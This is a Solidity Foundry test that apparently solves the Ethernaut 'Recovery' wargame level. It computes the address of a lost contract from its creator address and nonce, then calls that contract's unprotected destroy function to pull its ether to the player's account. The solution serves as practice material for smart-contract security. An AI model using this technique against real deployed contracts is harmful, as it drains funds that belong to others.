// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "ds-test/test.sol";
import "../src/levels/Recovery/Recovery.sol";
import "../src/levels/Recovery/RecoveryFactory.sol";
import "../src/Ethernaut.sol";
import {Vm} from "forge-std/Vm.sol";

contract RecoveryTest is DSTest {
    Ethernaut ethernaut;
    RecoveryFactory recoveryFactory;
    Vm private constant vm = Vm(HEVM_ADDRESS);
    address eoaAddress = address(69);

    function setUp() public {
        ethernaut = new Ethernaut();
        recoveryFactory = new RecoveryFactory();
        ethernaut.registerLevel(recoveryFactory);

        vm.deal(eoaAddress, 1 ether);
    }

    function testIsRecoveryCleared() public {
        vm.startPrank(eoaAddress);

        address instanceAddress = ethernaut.createLevelInstance{
            value: 0.001 ether
        }(recoveryFactory);

        address target = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            uint8(0xd6),
                            uint8(0x94),
                            instanceAddress,
                            uint8(0x01)
                        )
                    )
                )
            )
        );

        target.call(abi.encodeWithSignature("destroy(address)", eoaAddress));

        assertTrue(ethernaut.submitLevelInstance(payable(instanceAddress)));

        vm.stopPrank();
    }
}
